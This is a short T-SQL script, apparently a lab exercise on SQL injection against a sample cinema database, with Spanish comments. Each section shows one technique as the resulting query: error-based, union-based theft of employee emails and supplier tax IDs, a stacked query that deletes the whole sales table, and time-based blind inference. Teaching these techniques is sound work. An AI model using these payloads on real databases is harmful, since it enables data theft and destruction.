use cine;
GO

--a)basado en errores
SELECT Titulo_Pelicula, Genero_Peliculas FROM peliculas 
WHERE ID_Peliculas = 1 AND 
1=(SELECT CAST(@@VERSION AS INT));
GO

--b)basado en union 
SELECT Titulo_Pelicula, Clasificacion_Peliculas FROM peliculas
WHERE Clasificacion_Peliculas ='B15' UNION SELECT Nombre_Empleados, Correo_Empleados FROM empleados--';
GO;

--c)extraccion de datos 
SELECT ID_Cliente, Nombre_Cliente, Correo_Cliente FROM clientes
WHERE Nombre_Cliente LIKE '%X%' UNION SELECT RFC_Proveedor, RFC_Proveedor, Nom_Proveedor FROM proveedores --%';
GO;

--d)eliminacion de datos
DELETE FROM promociones 
WHERE ID_Promociones=3; DELETE FROM ventas;--';
GO;

SELECT * FROM ventas;

--e)basada en el tiempo
SELECT ID_Cliente FROM clientes
WHERE Correo_Cliente ='noexiste@dominio.com' 
AND Tel_Cliente = 'x' ;
IF (SELECT 
SUBSTRING(Nombre_Empleados, 1, 1) FROM empleados
WHERE ID_Empleados =8)= 'A' 
WAITFOR DELAY '0:0:5'--';
GO

SELECT * FROM empleados;
GO